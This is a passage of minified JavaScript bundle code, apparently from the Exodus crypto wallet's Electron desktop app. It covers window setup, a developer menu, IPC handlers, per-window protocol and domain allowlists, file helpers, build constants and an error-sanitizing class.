                    } else if (o.unknownFn && !1 === o.unknownFn(p) || a._.push(o.strings._ || !n(p) ? p : Number(p)), t.stopEarly) {
                        a._.push.apply(a._, e.slice(f + 1));
                        break
                    }
                }
                return Object.keys(s).forEach(function(e) {
                    var t, n, r;
                    t = a, n = e.split("."), r = t, n.slice(0, -1).forEach(function(e) {
                        r = r[e] || {}
                    }), n[n.length - 1] in r || (l(a, e.split("."), s[e]), (i[e] || []).forEach(function(t) {
                        l(a, t.split("."), s[e])
                    }))
                }), t["--"] ? (a["--"] = new Array, c.forEach(function(e) {
                    a["--"].push(e)
                })) : c.forEach(function(e) {
                    a._.push(e)
                }), a
            }
        }, function(e, t, n) {
            "use strict";
            const {
                toISOString: r
            } = Date.prototype, o = e => {
                if ([1 / 0, -1 / 0, NaN, void 0, null].includes(e)) return `${e}`;
                if (!["string", "boolean", "number"].includes(typeof e)) {
                    if ("object" != typeof e) throw new Error("Unexpected value type");
                    const t = Object.getPrototypeOf(e);
                    if (t === Date.prototype && e.toISOString === r) return `new Date(${o(r.call(e))})`;
                    if (!(t === Array.prototype && Array.isArray(e) || t === Object.prototype)) throw new Error("Unexpected object given as value")
                }
                return JSON.stringify(e).replace(/([{,])"__proto__":/g, '$1["__proto__"]:').replace(/[^\\]"__proto__":/g, () => {
                    throw new Error("Unreachable")
                }).replace(/[\u2028\u2029]/g, e => (e => `\\u${e.toString(16).padStart(4,"0")}`)(e.charCodeAt(0)))
            };
            e.exports = o
        }, function(e, t, n) {
            "use strict";
            n.d(t, "setDefaultProtocols", function() {
                return c
            }), n.d(t, "removeDefaultProtocols", function() {
                return u
            });
            var r = n(0),
                o = n(1),
                i = n(20),
                s = n.n(i);
            const a = [o.PROTOCOL];

            function c() {
                s.a.beginEvent("setDefaultProtocols"), a.forEach(e => r.app.setAsDefaultProtocolClient(e, process.execPath, ["--"])), s.a.endEvent("setDefaultProtocols")
            }

            function u() {
                a.forEach(e => r.app.removeAsDefaultProtocolClient(e, process.execPath, ["--"]))
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(12),
                o = n(14).fromCallback,
                i = n(113);
            e.exports = {
                remove: o(function(e, t) {
                    if (r.rm) return r.rm(e, {
                        recursive: !0,
                        force: !0
                    }, t);
                    i(e, t)
                }),
                removeSync: function(e) {
                    if (r.rmSync) return r.rmSync(e, {
                        recursive: !0,
                        force: !0
                    });
                    i.sync(e)
                }
            }
        }, function(e, t, n) {
            "use strict";
            var r = n(45),
                o = n.n(r),
                i = n(0),
                s = n(11),
                a = n.n(s),
                c = n(1),
                u = n(20),
                l = n(24),
                d = n(10),
                f = n(51),
                p = n(50),
                h = n(49),
                w = n(77),
                m = n(19),
                b = n(32),
                y = n(34);

            function g(e, ...t) {
                if ("function" != typeof e) throw new Error("Fist argument should be a function");
                const n = `(${e.toString()})(${t.map(e=>o()(e)).join(", ")})`;
                return () => Object(m.getWindow)().webContents.executeJavaScript(n)
            }
            const E = [
                    ["Nuke Wallet...", g(() => globalThis.Exodus.restore.deleteWalletFromDeveloperMenu())]
                ],
                v = a()(["Restore", [
                    ["Restore from 12-word phrase...", g(() => globalThis.Exodus.restore.fromRecoveryPhrase())],
                    ["Restore from recovery link...", g(() => globalThis.Exodus.restore.fromRecoveryLink())],
                    ["Restore from Safe Report...", g(() => globalThis.Exodus.import.safeReport.importFile())], ...c.ENV_DEV ? E : []
                ]]),
                O = a()(["Data Folder", [
                    ["Open Data Folder", () => i.shell.showItemInFolder(i.app.getPath("userData"))],
                    ["Export Zipped Data Folder", g(() => globalThis.Exodus.export.dir.data())],
                    ["Export Zipped Wallet Folder", g(() => globalThis.Exodus.export.dir.wallet())]
                ]]),
                S = a()(["Manage Portfolios", [
                    ["Enable All", g(() => globalThis.Exodus.portfolios.enableAll())]
                ]]),
                k = a()(["Notifications", [
                    ["On", {
                        type: "radio",
                        checked: !0
                    }, g(() => globalThis.flux.actions.config.notifications.tx.receive.enable())],
                    ["Off", {
                        type: "radio",
                        checked: !1
                    }, g(() => globalThis.flux.actions.config.notifications.tx.receive.disable())]
                ]]),
                D = a()(["Sound", [
                    ["Volume", [...Array(10).keys()].map(e => 10 * (e + 1)).map(e => [`${e}%`, {
                        type: "radio",
                        checked: 100 === e
                    }, g(e => globalThis.flux.actions.config.sounds.all.setVolume(e), e / 100)])],
                    ["Test Volume Level", g(() => globalThis.flux.store.dispatch({
                        type: "TEST_VOLUME"
                    }))]
                ]]),
                _ = e => {
                    const t = `(${(e=>globalThis.flux.actions.config.updateZoomFactor(e)).toString()})(${o()(e)})`;
                    Object(m.getWindow)().webContents.executeJavaScript(t)
                },
                N = a()(["Zoom", [
                    ["50%", {
                        type: "radio",
                        checked: !1
                    }, () => _(.5)],
                    ["75%", {
                        type: "radio",
                        checked: !1
                    }, () => _(.75)],
                    ["100%", {
                        type: "radio",
                        checked: !0
                    }, () => _(1)],
                    ["150%", {
                        type: "radio",
                        checked: !1
                    }, () => _(1.5)],
                    ["200%", {
                        type: "radio",
                        checked: !1
                    }, () => _(2)],
                    ["300%", {
                        type: "radio",
                        checked: !1
                    }, () => _(3)]
                ]]),
                x = a()(["Windows", [
                    ["Network", [
                        ["Visible", {
                            type: "checkbox",
                            checked: !1
                        }, e => {
                            const t = Object(h.getWindow)();
                            t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
                        }]
                    ]],
                    ["Wallet", [
                        ["Visible", {
                            type: "checkbox",
                            checked: !1
                        }, e => {
                            const t = Object(y.getWindow)();
                            t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
                        }]
                    ]],
                    ["Monero", [
                        ["Visible", {
                            type: "checkbox",
                            checked: !1
                        }, e => {
                            const t = Object(p.getWindow)();
                            t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
                        }]
                    ]],
                    ["Core", [
                        ["Visible", {
                            type: "checkbox",
                            checked: !1
                        }, e => {
                            const t = Object(f.getWindow)();
                            t.isVisible() ? t.hide() : t.show(), e.checked = t.isVisible()
                        }]
                    ]],
                    ["Unlock", [
                        ["Dev Tools Visible", {
                            type: "checkbox",
                            checked: !1
                        }, e => {
                            const t = Object(b.getWindow)();
                            e.checked = !t.webContents.isDevToolsOpened(), t.webContents.isDevToolsOpened() ? t.webContents.closeDevTools() : t.webContents.openDevTools()
                        }]
                    ]]
                ]]),
                C = a()(["Debug Mode", [
                    ["On", {
                        type: "radio",
                        checked: l.isExistsSync()
                    }, function() {
                        l.isExistsSync() || j()
                    }],
                    ["Off", {
                        type: "radio",
                        checked: !l.isExistsSync()
                    }, function() {
                        l.isExistsSync() && j()
                    }]
                ]]);

            function j() {
                l[l.isExistsSync() ? "remove" : "create"](async e => {
                    e ? await i.dialog.showMessageBox({
                        title: "Restart",
                        message: `Debug mode is now ${l.isExistsSync()?"on":"off"}. Please restart Exodus to activate the changes.`,
                        buttons: ["OK"]
                    }) : await i.dialog.showMessageBox({
                        title: "Error",
                        message: "There was a problem! Debug mode could not be changed!",
                        buttons: ["OK"]
                    })
                })
            }
            t.default = a()(["Developer", [v, O, k, D, x, N, "-", ["Open Developer Tools", () => Object(d.default)()],
                ["Open Current App Developer Tools", g(() => globalThis.Exodus.dapps.showDevTools())], C, "-", ["Export Safe Report Data", g(() => globalThis.Exodus.export.safeReport.dumpDiagnostics())], ...u.PERF_METRICS_FEATURES ? [
                    ["Export Performance Metrics", g(() => globalThis.Exodus.export.performanceMetrics.exportToFile())]
                ] : [],
                ["Export All Transactions", g(() => globalThis.Exodus.export.transactions.exportTransactions())], S, ["View Recovery Phrase", () => Object(w.init)()]
            ]])
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getWindow", function() {
                return d
            }), n.d(t, "init", function() {
                return f
            });
            var r = n(0),
                o = n(8),
                i = n(10),
                s = n(13),
                a = n(5),
                c = n(7);
            const u = {
                ...c.default,
                backgroundColor: "#fff",
                x: 0,
                y: 0,
                fullscreen: !1,
                fullscreenable: !1,
                maximizable: !1,
                minimizable: !1,
                resizable: !0,
                show: !1,
                skipTaskbar: !1,
                title: "Network Process (hidden window)",
                webPreferences: {
                    ...c.isolation,
                    partition: "persist:network",
                    backgroundThrottling: !1
                }
            };
            let l = null;
            const d = () => l;

            function f() {
                const e = r.screen.getPrimaryDisplay().size,
                    t = {
                        ...u,
                        width: e.width / 3,
                        height: e.height / 2
                    };
                l = new r.BrowserWindow(t), Object(o.registerWebContents)(l.webContents, "network"), Object(s.forwardErrors)(l.webContents, "network"), l.loadFile(a.WINDOW_NETWORK), Object(i.default)({
                    windowHandle: l.webContents,
                    windowId: "network"
                }), l.webContents.on("will-navigate", e => {
                    e.preventDefault()
                });
                let n = !1;
                return r.app.on("before-quit", () => {
                    n = !0, l.isDestroyed() || l.close()
                }), l.on("close", function(e) {
                    n || (e.preventDefault(), l.hide())
                }), l
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getWindow", function() {
                return d
            }), n.d(t, "init", function() {
                return f
            });
            var r = n(0),
                o = n(8),
                i = n(10),
                s = n(13),
                a = n(5),
                c = n(7);
            const u = {
                ...c.default,
                x: 0,
                y: 0,
                backgroundColor: "#fff",
                width: 1120,
                height: 980,
                minWidth: 300,
                minHeight: 400,
                show: !1,
                title: "Monero Process (hidden window)",
                webPreferences: {
                    ...c.isolation,
                    partition: "persist:monero",
                    backgroundThrottling: !1
                }
            };
            let l = null;
            const d = () => l;

            function f(e) {
                const t = r.screen.getPrimaryDisplay().size,
                    n = {
                        ...u,
                        width: t.width / 3,
                        height: t.height / 2
                    };
                l = new r.BrowserWindow(n), Object(o.registerWebContents)(l.webContents, "monero"), Object(s.forwardErrors)(l.webContents, "monero"), l.loadFile(a.WINDOW_MONERO), Object(i.default)({
                    windowHandle: l.webContents,
                    windowId: "monero"
                });
                let c = !1;
                return r.app.on("before-quit", () => {
                    c = !0, l.isDestroyed() || l.close()
                }), l.on("close", function(e) {
                    c || (e.preventDefault(), l.hide())
                }), l
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getWindow", function() {
                return m
            }), n.d(t, "init", function() {
                return b
            });
            var r = n(0),
                o = n(26),
                i = n.n(o),
                s = n(36),
                a = n(28),
                c = n(5),
                u = n(8),
                l = n(10),
                d = n(13),
                f = n(7);
            const p = e => i.a.existsSync(`${e}.lock`),
                h = {
                    ...f.default,
                    backgroundColor: "#fff",
                    x: 0,
                    y: 0,
                    fullscreen: !1,
                    fullscreenable: !1,
                    maximizable: !1,
                    minimizable: !1,
                    resizable: !0,
                    show: !1,
                    skipTaskbar: !1,
                    title: "Core process (hidden window)",
                    webPreferences: {
                        ...f.integration,
                        partition: "core",
                        backgroundThrottling: !1
                    }
                };
            let w = null;
            const m = () => w;

            function b() {
                const e = r.screen.getPrimaryDisplay().size,
                    t = {
                        ...h,
                        width: e.width / 3,
                        height: e.height / 2
                    };
                w = new r.BrowserWindow(t), Object(u.registerWebContents)(w.webContents, "core"), Object(d.forwardErrors)(w.webContents, "core"), w.loadFile(c.WINDOW_CORE), Object(l.default)({
                    windowHandle: w.webContents,
                    windowId: "core"
                }), w.webContents.on("will-navigate", e => {
                    e.preventDefault()
                });
                let n = !1;
                return r.app.on("before-quit", e => {
                    const t = Object(s.default)(Object(a.walletDir)());
                    p(t.storageFile) || p(t.unsafeStorageFile) ? (console.log("storage.seco is still writing"), e.preventDefault(), setTimeout(() => r.app.quit(), 2e3)) : (n = !0, w.isDestroyed() || w.close())
                }), w.on("close", function(e) {
                    n || (e.preventDefault(), w.hide())
                }), w
            }
        }, function(e, t) {
            e.exports = require("child_process")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "WALLET_DIR", function() {
                return r
            });
            const r = "exodus.wallet"
        }, function(e, t) {
            var n = 1e3,
                r = 60 * n,
                o = 60 * r,
                i = 24 * o,
                s = 365.25 * i;

            function a(e, t, n) {
                if (!(e < t)) return e < 1.5 * t ? Math.floor(e / t) + " " + n : Math.ceil(e / t) + " " + n + "s"
            }
            e.exports = function(e, t) {
                t = t || {};
                var c, u = typeof e;
                if ("string" === u && e.length > 0) return function(e) {
                    if ((e = String(e)).length > 1e4) return;
                    var t = /^((?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|years?|yrs?|y)?$/i.exec(e);
                    if (!t) return;
                    var a = parseFloat(t[1]);
                    switch ((t[2] || "ms").toLowerCase()) {
                        case "years":
                        case "year":
                        case "yrs":
                        case "yr":
                        case "y":
                            return a * s;
                        case "days":
                        case "day":
                        case "d":
                            return a * i;
                        case "hours":
                        case "hour":
                        case "hrs":
                        case "hr":
                        case "h":
                            return a * o;
                        case "minutes":
                        case "minute":
                        case "mins":
                        case "min":
                        case "m":
                            return a * r;
                        case "seconds":
                        case "second":
                        case "secs":
                        case "sec":
                        case "s":
                            return a * n;
                        case "milliseconds":
                        case "millisecond":
                        case "msecs":
                        case "msec":
                        case "ms":
                            return a;
                        default:
                            return
                    }
                }(e);
                if ("number" === u && !1 === isNaN(e)) return t.long ? a(c = e, i, "day") || a(c, o, "hour") || a(c, r, "minute") || a(c, n, "second") || c + " ms" : function(e) {
                    if (e >= i) return Math.round(e / i) + "d";
                    if (e >= o) return Math.round(e / o) + "h";
                    if (e >= r) return Math.round(e / r) + "m";
                    if (e >= n) return Math.round(e / n) + "s";
                    return e + "ms"
                }(e);
                throw new Error("val is not a non-empty string or a valid number. val=" + JSON.stringify(e))
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "isDeepLink", function() {
                return i
            }), n.d(t, "maybeDeepLink", function() {
                return s
            });
            var r = n(1),
                o = n(3);
            const i = e => {
                    return new RegExp(`^${r.PROTOCOL}://fiat-(on|off)ramp`).test(e)
                },
                s = e => {
                    if (!e || !i(e)) return;
                    const {
                        host: t,
                        path: n,
                        params: r
                    } = (e => {
                        const {
                            hostname: t,
                            pathname: n,
                            searchParams: r
                        } = new URL(e);
                        return {
                            host: t,
                            path: n.slice(1),
                            params: Object.fromEntries(r.entries())
                        }
                    })(e);
                    o.appWindows.ui.webContents.send("fiat-onramp:data", {
                        host: t,
                        path: n,
                        params: r
                    }), o.appWindows.background.show()
                }
        }, function(e, t, n) {
            "use strict";
            var r = n(0),
                o = n(4),
                i = n(79),
                s = n(62),
                a = n(48),
                c = n(76),
                u = n(75);
            const l = [s.default];
            l.push(c.default), "darwin" !== process.platform && l.push(a.default), l.push(u.default);
            const d = r.Menu.buildFromTemplate(l),
                f = (e, t) => e.items.find(e => e.label === t);
            o.rpcMain.on("config:notifications", (e, {
                volumeLevel: t,
                notificationsTxReceivedEnabled: n,
                zoomFactor: r,
                onStartup: o
            }) => {
                const a = (() => "darwin" === process.platform ? f(f(d, s.appName).submenu, "Developer").submenu : f(d, "Developer").submenu)();
                f(f(a, "Notifications").submenu, n ? "On" : "Off").checked = !0;
                const c = f(a, "Sound"),
                    u = f(c.submenu, "Volume");
                f(u.submenu, `${parseInt(100*t)}%`).checked = !0;
                const l = f(a, "Zoom");
                f(l.submenu, `${parseInt(100*r)}%`).checked = !0;
                const p = !o;
                Object(i.default)(r, p)
            }), t.default = d
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromCallback,
                o = n(12),
                i = n(2),
                s = n(21),
                a = n(30).pathExists;
            e.exports = {
                outputFile: r(function(e, t, n, r) {
                    "function" == typeof n && (r = n, n = "utf8");
                    const c = i.dirname(e);
                    a(c, (i, a) => i ? r(i) : a ? o.writeFile(e, t, n, r) : void s.mkdirs(c, i => {
                        if (i) return r(i);
                        o.writeFile(e, t, n, r)
                    }))
                }),
                outputFileSync: function(e, ...t) {
                    const n = i.dirname(e);
                    if (o.existsSync(n)) return o.writeFileSync(e, ...t);
                    s.mkdirsSync(n), o.writeFileSync(e, ...t)
                }
            }
        }, function(e, t) {
            e.exports = {
                stringify: function(e, {
                    EOL: t = "\n",
                    finalEOL: n = !0,
                    replacer: r = null,
                    spaces: o
                } = {}) {
                    const i = n ? t : "";
                    return JSON.stringify(e, r, o).replace(/\n/g, t) + i
                },
                stripBom: function(e) {
                    return Buffer.isBuffer(e) && (e = e.toString("utf8")), e.replace(/^\uFEFF/, "")
                }
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromCallback;
            e.exports = {
                copy: r(n(118)),
                copySync: n(115)
            }
        }, function(e, t) {
            e.exports = require("module")
        }, function(e, t) {
            e.exports = require("crypto")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "appName", function() {
                return c
            });
            var r = n(0),
                o = n(11),
                i = n.n(o),
                s = n(1),
                a = n(48);
            const c = (() => s.ENV_BUILD_EXODUS ? "Exodus" : s.ENV_BUILD_EDEN ? "Eden" : s.ENV_BUILD_NAME)();
            let u;
            u = "darwin" === process.platform ? i()([c, [
                ["About " + c, "about"], a.default, "-", {
                    ...i()(["Services", "services"]),
                    submenu: []
                }, "-", ["Hide " + c, "Command+H", "hide"],
                ["Hide Others", "Command+Shift+H", "hideothers"],
                ["Show All", "unhide"], "-", ["Quit", "Command+Q", r.app.quit.bind(r.app)]
            ].filter(e => !!e)]) : i()(["File", [
                ["Quit", "Command+Q", r.app.quit.bind(r.app)]
            ].filter(e => !!e)]), t.default = u
        }, function(e, t, n) {
            const {
                app: r,
                screen: o,
                desktopCapturer: i
            } = n(0), s = n(31), {
                windowFromWebContents: a
            } = n(23), c = {
                on: new Map,
                handle: new Map
            };
            c.on.set("app:exit", (e, t) => {
                r.exit(t)
            }), c.on.set("app:quit", () => {
                r.quit()
            }), c.on.set("app:relaunch", (e, {
                addArgs: t
            } = {}) => {
                t ? r.relaunch({
                    args: process.argv.slice(1).concat(t)
                }) : r.relaunch(), e.returnValue = 0
            }), c.on.set("app:meta", e => {
                e.returnValue = {
                    DEBUG_MODE: globalThis.DEBUG_MODE
                }
            }), c.on.set("app:path", (e, t) => {
                if ("app" === t) e.returnValue = r.getAppPath();
                else {
                    if (!["desktop", "userData"].includes(t)) throw e.returnValue = void 0, new Error(`Unsupported type: ${t}`);
                    e.returnValue = r.getPath(t)
                }
            }), c.on.set("app:os:cpus", e => {
                e.returnValue = s.cpus().length
            }), c.on.set("app:os:meta", e => {
                e.returnValue = {
                    arch: s.arch(),
                    platform: s.platform(),
                    type: s.type(),
                    release: s.release(),
                    cpus: s.cpus().length,
                    eol: s.EOL
                }
            }), c.handle.set("app:os:info", () => ({
                arch: s.arch(),
                platform: s.platform(),
                type: s.type(),
                release: s.release(),
                freemem: s.freemem(),
                totalmem: s.totalmem(),
                cpus: s.cpus().length
            })), c.handle.set("app:os:tmpdir", () => s.tmpdir()), c.on.set("sender:position:get", (e, t = {}) => {
                const n = a(e.sender);
                e.returnValue = n ? n.getPosition() : void 0
            }), c.on.set("sender:size:get", (e, t = {}) => {
                const n = a(e.sender);
                e.returnValue = n ? n.getSize() : void 0
            }), c.on.set("sender:sheetOffset:set", (e, ...t) => {
                const n = a(e.sender);
                n && n.setSheetOffset(...t), e.returnValue = n ? 0 : 1
            }), c.on.set("sender:close", (e, t = {}) => {
                a(e.sender).close(), e.returnValue = void 0
            }), c.handle.set("screen:display:all", () => o.getAllDisplays()), c.handle.set("screen:display:current", e => {
                const t = a(e.sender);
                if (!t) return;
                const [n, r] = t.getPosition();
                return o.getDisplayNearestPoint({
                    x: n,
                    y: r
                })
            }), c.handle.set("screen:capturer:sources", async () => {
                const e = await i.getSources({
                    types: ["screen"]
                });
                return JSON.parse(JSON.stringify(e))
            }), e.exports = c
        }, function(e, t, n) {
            "use strict";
            var r = n(0),
                o = n(26),
                i = n.n(o),
                s = n(2),
                a = n.n(s);
            const c = e => Number.isInteger(e);
            t.default = function(e) {
                let t, n;
                const o = {
                        ...{
                            defaultWidth: 800,
                            defaultHeight: 600,
                            maximize: !0,
                            fullScreen: !0
                        },
                        ...e
                    },
                    s = a.a.join(r.app.getPath("userData"), "window-state.json");
                try {
                    if (t = JSON.parse(i.a.readFileSync(s, "utf8").replace(/^\uFEFF/, "")))
                        if ((({
                                x: e,
                                y: t,
                                width: n,
                                height: r
                            }) => c(e) && c(t) && c(n) && c(r) && n > 0 && r > 0)(t)) {
                            r.screen.getAllDisplays().some(e => (({
                                x: e,
                                y: t,
                                width: n,
                                height: r
                            }, o) => e >= o.x && t >= o.y && e + n <= o.x + o.width && t + r <= o.y + o.height)(t, e.bounds)) || (t = {
                                x: 0,
                                y: 0
                            })
                        } else t.isMaximized || t.isFullScreen || (t = null);
                    else t = null
                } catch {}
                let u;
                t = {
                    width: o.defaultWidth,
                    height: o.defaultHeight,
                    ...t
                };
                const l = {
                    stateChange() {
                        clearTimeout(u), u = setTimeout(l.updateState, 100)
                    },
                    updateState() {
                        if (n) try {
                            if (!n.isMaximized() && !n.isMinimized() && !n.isFullScreen()) {
                                const {
                                    x: e,
                                    y: r,
                                    width: o,
                                    height: i
                                } = n.getBounds();
                                Object.assign(t, {
                                    x: e,
                                    y: r,
                                    width: o,
                                    height: i
                                })
                            }
                            t.isMaximized = n.isMaximized(), t.isFullScreen = n.isFullScreen()
                        } catch (e) {}
                    },
                    closed() {
                        n && (n.removeListener("resize", l.stateChange), n.removeListener("move", l.stateChange), n.removeListener("close", l.updateState), n.removeListener("closed", l.closed), n = null), clearTimeout(u);
                        try {
                            i.a.mkdirSync(a.a.dirname(s), {
                                recursive: !0
                            }), i.a.writeFileSync(s, `${JSON.stringify(t)}\n`)
                        } catch {}
                    }
                };
                return {
                    bounds: () => ({
                        x: t.x,
                        y: t.y,
                        width: t.width,
                        height: t.height
                    }),
                    isMaximized: () => t.isMaximized,
                    isFullScreen: () => t.isFullScreen,
                    manage(e) {
                        n = e, o.maximize && t.isMaximized && n.maximize(), o.fullScreen && t.isFullScreen && n.setFullScreen(!0), n.on("resize", l.stateChange), n.on("move", l.stateChange), n.on("close", l.updateState), n.on("closed", l.closed)
                    }
                }
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "CHANNEL_PREFIX", function() {
                return r
            });
            const r = "electron-rpc-broadcast"
        }, function(e, t, n) {
            e.exports = n(127)
        }, function(e, t, n) {
            "use strict";
            n.d(t, "meta", function() {
                return l
            });
            var r = n(0),
                o = n(2),
                i = n.n(o),
                s = n(15),
                a = n(5);
            const c = r.app.getAppPath();

            function u(e) {
                if (! function(e) {
                        const t = i.a.basename(e);
                        return !!/^[a-z-]+(\.dev)?\.html$/.test(t) && e === i.a.join("src/static", t)
                    }(e)) throw new Error("Unexpected html file path");
                const t = i.a.join(c, e);
                return Object(s.pathToFileURL)(t).toString()
            }
            const l = new Map(Object.entries({
                nfts: {
                    url: u(a.WINDOW_NFTS),
                    protocols: ["file:", "https:", " -nfts-api:", ...[]],
                    domains: ["nfts-proxy.exodus.io", ...[]],
                    ipc: !1,
                    permissions: ["clipboard-sanitized-write"]
                },
                ui: {
                    persistName: "main",
                    url: u(a.WINDOW_EXODUS),
                    protocols: ["file:", "https:", "wss:", "localhost"],
                    domains: "*",
                    persistent: !0,
                    ipc: !0,
                    permissions: ["media", "openExternal", "clipboard-sanitized-write", "clipboard-read"],
                    flags: ["trezor-origin"],
                    downloads: [{
                        prefix: "blob:file://",
                        mimetypes: ["application/pdf"],
                        open: !0
                    }]
                },
                keyviewer: {
                    url: u(a.WINDOW_KEYVIEWER),
                    protocols: ["file:"],
                    offline: !0,
                    multiple: !0,
                    ipc: !0
                },
                monero: {
                    url: u(a.WINDOW_MONERO),
                    protocols: ["file:", "https:", "wss:", "localhost"],
                    domains: "*",
                    persistent: !0,
                    ipc: !0
                },
                network: {
                    url: u(a.WINDOW_NETWORK),
                    protocols: ["file:", "https:", "wss:", "localhost"],
                    domains: "*",
                    persistent: !0,
                    ipc: !0
                },
                core: {
                    url: u(a.WINDOW_CORE),
                    protocols: ["file:"],
                    offline: !0,
                    ipc: !0
                },
                passphrase: {
                    url: u(a.WINDOW_PASSPHRASE),
                    protocols: ["file:"],
                    offline: !0,
                    ipc: !0
                },
                "scan-qr": {
                    url: u(a.WINDOW_SCAN_QR),
                    protocols: ["file:"],
                    offline: !0,
                    ipc: !0,
                    permissions: ["media"]
                },
                unlock: {
                    url: u(a.WINDOW_UNLOCK),
                    protocols: ["file:"],
                    offline: !0,
                    ipc: !0
                },
                recovery: {
                    url: u(a.WINDOW_RECOVERY),
                    protocols: ["file:"],
                    offline: !0,
                    ipc: !0,
                    multiple: !0,
                    persistent: !0
                },
                wallet: {
                    url: u(a.WINDOW_WALLET),
                    protocols: ["file:", "https:"],
                    domains: ["server.exodus.io", "exodusapp.blob.core.windows.net"],
                    multiple: !0,
                    persistent: !0,
                    ipc: !0
                }
            }))
        }, function(e, t, n) {
            "use strict";
            const r = n(12);
            e.exports = {
                utimesMillis: function(e, t, n, o) {
                    r.open(e, "r+", (e, i) => {
                        if (e) return o(e);
                        r.futimes(i, t, n, e => {
                            r.close(i, t => {
                                o && o(e || t)
                            })
                        })
                    })
                },
                utimesMillisSync: function(e, t, n) {
                    const o = r.openSync(e, "r+");
                    return r.futimesSync(o, t, n), r.closeSync(o)
                }
            }
        }, function(e, t) {
            e.exports = require("assert")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "PACKAGE", function() {
                return a
            }), n.d(t, "ENV_PROD", function() {
                return c
            }), n.d(t, "ENV_TEST", function() {
                return u
            }), n.d(t, "ENV_DEV", function() {
                return l
            }), n.d(t, "ENV_BUILD_NAME", function() {
                return d
            }), n.d(t, "ENV_BUILD_EXODUS", function() {
                return f
            }), n.d(t, "ENV_BUILD_EDEN", function() {
                return p
            }), n.d(t, "ENV_EXODUS_PROD", function() {
                return h
            }), n.d(t, "NIGHTLY_BUILD", function() {
                return w
            }), n.d(t, "FLAG_FILE_RESTORE_MNEMONIC", function() {
                return m
            }), n.d(t, "FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE", function() {
                return b
            }), n.d(t, "AUTO_UPDATE_BASE_URL", function() {
                return y
            }), n.d(t, "PROTOCOL", function() {
                return g
            }), n.d(t, "UNLOCK_WINDOW_HEIGHT", function() {
                return E
            }), n.d(t, "MIN_WIDTH", function() {
                return v
            }), n.d(t, "MIN_HEIGHT", function() {
                return O
            });
            var r = n(16),
                o = n(54),
                i = n.n(o),
                s = n(94);
            const a = n.n(s).a,
                c = !0,
                u = !1,
                l = u || !1,
                d = "",
                f = "" === d,
                p = "eden" === d,
                h = c && f,
                w = !1,
                m = "restore-mnemonic",
                b = "restore-from-current-phrase",
                y = p ? "https://updates.exodus.io/releases/eden" : "https://updates.exodus.io/releases",
                g = (i()("3s"), r.fiatUnit, r.moneroInitialHeight, r.moneroInitialHeight, r.moneroSubaddressesEnabled, r.moneroSubaddressesEnabled, r.themeName, r.rbfEnabledBitcoin, r.rbfEnabledEthereum, r.adaLegacyAddressEnabled, r.bitcoinLegacyAddressEnabled, r.bitcoinTaprootAddressEnabled, r.wentThroughFiatOnboarding, p ? "exodus-eden" : "exodus"),
                E = 440,
                v = 1244,
                O = 700
        }, function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, "SafeError", function() {
                return b
            });
            var r = n(96),
                o = n.n(r),
                i = n(40),
                s = n(95),
                a = 0;

            function c(e) {
                return "__private_" + a++ + "_" + e
            }

            function u(e, t) {
                if (!Object.prototype.hasOwnProperty.call(e, t)) throw new TypeError("attempted to use private field on non-instance");
                return e
            }

            function l(e) {
                return new Set(e)
            }
            const d = l(["EPIPE"]),
                f = l(["Error", "AssertionError", "TypeError", "RangeError", "UnknownError", "SafeErrorFailedToParse", "TimeoutError"]),
                p = {
                    __proto__: null,
                    broadcastTx: {
                        general: "broadcastTx",
                        other: "otherErr:broadcastTx",
                        retry: "retry:broadcastTx"
                    },
                    getNftArguments: {
                        general: "getNftArguments"
                    },
                    ethCall: {
                        general: "ethCall",
                        executionReverted: "ethCall:executionReverted"
                    },
                    safeError: {
                        failedToParse: "failed to parse error"
                    }
                },
                h = l(Object.values(p).flatMap(e => Object.values(e)));

            function w(e) {
                if ("string" == typeof e && "" !== e) return function(e) {
                    return h.has(e)
                }(e) ? e : [...h].find(t => e.includes(t))
            }
            const m = Symbol("SafeError");
            class b {
                static from(e) {
                    let t, n, r;
                    try {
                        const {
                            name: s,
                            message: a,
                            hint: c,
                            code: u
                        } = e;
                        o = s, t = f.has(o) ? s : "UnknownError";
                        const l = `${u}`;
                        n = function(e) {
                            return d.has(e) || /^(EXOD-)?\d{1,4}$/u.test(e)
                        }(l) ? l : void 0, r = w(c) || w(a);
                        const p = Object(i.default)(e);
                        return new b({
                            name: t,
                            code: n,
                            hint: r,
                            stack: p,
                            initSymbol: m
                        })
                    } catch {
                        try {
                            return t ? new b({
                                name: t,
                                code: n,
                                hint: r,
                                initSymbol: m
                            }) : S
                        } catch {
                            return S
                        }
                    }
                    var o
                }
                get name() {
                    return u(this, y)[y]
                }
                get code() {
                    return u(this, g)[g]
                }
                get hint() {
                    return u(this, E)[E]
                }
                get stackFrames() {
                    var e;
                    return null == (e = u(this, v)[v]) ? void 0 : e.map(e => ({
                        __proto__: null,
                        ...e
                    }))
                }
                get stack() {
                    const e = Object(i.stackFramesToString)(this.stackFrames);
                    return e ? `${this.name}: ${this.code||this.hint||"unknownHint"}\n${e}` : void 0
                }
                get timestamp() {
                    return u(this, O)[O]
                }
                toJSON() {
                    return Object(s.omitUndefined)({
                        __proto__: null,
                        name: this.name,
                        code: this.code,
                        hint: this.hint,
                        stack: this.stack,
                        timestamp: this.timestamp
                    })
                }
                constructor({
                    name: e,
                    code: t,
                    hint: n,
                    stack: r,
                    initSymbol: i
                }) {
                    Object.defineProperty(this, y, {
                        writable: !0,
                        value: void 0
                    }), Object.defineProperty(this, g, {
                        writable: !0,
                        value: void 0
                    }), Object.defineProperty(this, E, {
                        writable: !0,
                        value: void 0
                    }), Object.defineProperty(this, v, {
